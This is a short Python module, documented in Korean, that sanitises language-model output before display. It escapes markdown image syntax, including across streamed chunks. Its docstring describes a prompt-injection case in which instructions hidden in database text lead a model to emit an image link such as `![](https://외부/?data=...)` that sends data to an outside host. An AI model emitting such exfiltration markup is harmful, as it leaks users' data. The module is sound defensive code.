"""LLM 출력을 화면에 그리기 전 안전 처리.

계약 메모 같은 DB 텍스트에 악성 지시가 섞이면(프롬프트 인젝션) 모델이 `![](https://외부/?data=...)` 같은
마크다운 이미지를 출력할 수 있다. 브라우저가 이미지를 자동으로 불러오면서 데이터가 외부로 새므로,
이미지 문법을 무력화한다. 링크는 클릭해야 열리므로 그대로 둔다.
"""

import re
from collections.abc import Iterable, Iterator

_IMAGE = re.compile(r"!\[")


def neutralize_images(text: str) -> str:
    return _IMAGE.sub(r"\\![", text)


def safe_lines(chunks: Iterable[str]) -> Iterator[str]:
    """스트리밍 조각을 줄 단위로 모아 안전 처리 후 내보낸다 (`![`가 조각 경계에 걸려도 놓치지 않도록)."""
    buffer = ""
    for chunk in chunks:
        buffer += chunk
        *lines, buffer = buffer.split("\n")
        for line in lines:
            yield neutralize_images(line) + "\n"
    if buffer:
        yield neutralize_images(buffer)
